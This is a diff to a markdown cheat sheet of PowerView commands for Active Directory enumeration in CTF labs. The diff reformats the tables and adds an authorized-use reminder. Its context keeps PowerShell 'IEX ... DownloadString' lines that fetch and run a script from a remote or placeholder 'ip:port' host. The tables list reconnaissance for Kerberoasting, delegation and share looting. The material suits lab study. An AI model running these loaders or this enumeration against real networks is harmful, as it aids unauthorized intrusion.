@@ -99,60 +99,55 @@ IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com
 
 IEX (New-Object Net.WebClient).DownloadString("http://ip:port/PowerView.ps1")
 ```
+| Command | Purpose |
+|---|---|
+| `Get-Domain` | Retrieves information about the current domain |
+| `Get-DomainController` | Finds domain controllers |
+| `Get-DomainUser` | Enumerates domain users |
+| `Get-DomainComputer` | Enumerates domain computers |
+| `Get-DomainGroup` | Enumerates domain groups |
+| `Get-DomainGroupMember` | Lists members of a specified group |
+| `Get-DomainPolicy` | Retrieves domain policy information |
+| `Get-DomainOU` | Enumerates Organizational Units |
+| `Get-DomainGPO` | Enumerates Group Policy Objects |
+| `Get-DomainGPOLocalGroup` | Identifies local group membership configured through GPOs |
 
-## Important PowerView Commands for AD CTFs
+| Command | Purpose |
+|---|---|
+| `Get-DomainUser -Identity "<username>"` | Retrieves details for a specific user |
+| `Get-DomainUser -SPN` | Finds users with Service Principal Names (Kerberoasting candidates) |
+| `Get-DomainUser -PreauthNotRequired` | Finds accounts that do not require Kerberos pre-authentication |
+| `Get-DomainGroup -Identity "<group>"` | Retrieves details for a specific group |
+| `Get-DomainGroupMember -Identity "<group>"` | Lists members of a specified group |
+| `Find-DomainUserLocation` | Finds computers where domain users may be logged on |
 
-Command                                  | Purpose
------------------------------------------|------------------------------------------------------------
-Get-Domain                              | Retrieves information about the current domain
-Get-DomainController                    | Finds domain controllers
-Get-DomainUser                           | Enumerates domain users
-Get-DomainComputer                       | Enumerates domain computers
-Get-DomainGroup                          | Enumerates domain groups
-Get-DomainGroupMember                    | Lists members of a specified group
-Get-DomainPolicy                         | Retrieves domain policy information
-Get-DomainOU                             | Enumerates Organizational Units
-Get-DomainGPO                            | Enumerates Group Policy Objects
-Get-DomainGPOLocalGroup                  | Identifies local group membership configured through GPOs
+| Command | Purpose |
+|---|---|
+| `Get-DomainTrust` | Enumerates domain trusts |
+| `Get-Forest` | Retrieves forest information |
+| `Get-ForestDomain` | Lists domains in the forest |
+| `Get-ForestTrust` | Enumerates forest trusts |
 
-### Important User and Group Queries
+| Command | Purpose |
+|---|---|
+| `Find-InterestingDomainAcl` | Finds potentially interesting domain ACLs |
+| `Get-DomainObjectAcl` | Retrieves ACLs on domain objects |
+| `Get-ObjectAcl` | Retrieves object ACLs; availability depends on version |
+| `Find-LocalAdminAccess` | Checks where the current user has local administrator access |
+| `Get-DomainComputer -Unconstrained` | Finds computers configured for unconstrained delegation |
+| `Get-DomainUser -TrustedToAuth` | Finds users configured for constrained delegation |
+| `Get-DomainComputer -TrustedToAuth` | Finds computers configured for constrained delegation |
 
-Get-DomainUser -Identity <username>      | Retrieves details for a specific user
-Get-DomainUser -SPN                      | Finds users with Service Principal Names (Kerberoasting candidates)
-Get-DomainUser -PreauthNotRequired       | Finds accounts that do not require Kerberos pre-authentication
-Get-DomainGroup -Identity "<group>"      | Retrieves details for a specific group
-Get-DomainGroupMember -Identity "<group>"| Lists members of a specific group
-Find-DomainUserLocation                  | Finds computers where domain users may be logged on
-
-### Domain Trusts and Relationships
-
-Get-DomainTrust                          | Enumerates domain trusts
-Get-Forest                               | Retrieves forest information
-Get-ForestDomain                         | Lists domains in the forest
-Get-ForestTrust                          | Enumerates forest trusts
-
-### Permissions and Attack-Path Enumeration
-
-Find-InterestingDomainAcl                | Finds interesting domain ACLs
-Get-DomainObjectAcl                      | Retrieves ACLs on domain objects
-Get-ObjectAcl                            | Retrieves ACLs on specified objects (availability depends on version)
-Find-LocalAdminAccess                    | Checks where the current user has local administrator access
-Get-DomainComputer -Unconstrained        | Finds computers configured for unconstrained delegation
-Get-DomainUser -TrustedToAuth             | Finds users configured for constrained delegation
-Get-DomainComputer -TrustedToAuth        | Finds computers configured for constrained delegation
-
-### Shares and Local Computer Enumeration
-
-Find-DomainShare                         | Searches for domain file shares
-Find-InterestingDomainShareFile           | Searches shares for potentially interesting files
-Get-NetLocalGroup                        | Enumerates local groups on accessible computers
-Get-NetLocalGroupMember                  | Lists members of local groups on accessible computers
-
-### Useful Reminders
+| Command | Purpose |
+|---|---|
+| `Find-DomainShare` | Searches for domain file shares |
+| `Find-InterestingDomainShareFile` | Searches shares for potentially interesting files |
+| `Get-NetLocalGroup` | Enumerates local groups on accessible computers |
+| `Get-NetLocalGroupMember` | Lists members of local groups on accessible computers |
 
 - Run PowerView from a PowerShell session where the script is loaded.
 - Some commands require domain connectivity or sufficient permissions.
-- PowerView function names and supported parameters vary by version.
-- Start with domain, user, group, computer, and trust enumeration before investigating ACLs and delegation.
-
+- PowerView function names and supported parameters can vary by version.
+- Start with domain, user, group, and computer enumeration before investigating trusts, ACLs, and delegation.
+- Use these commands only in authorized labs or CTF environments.
 
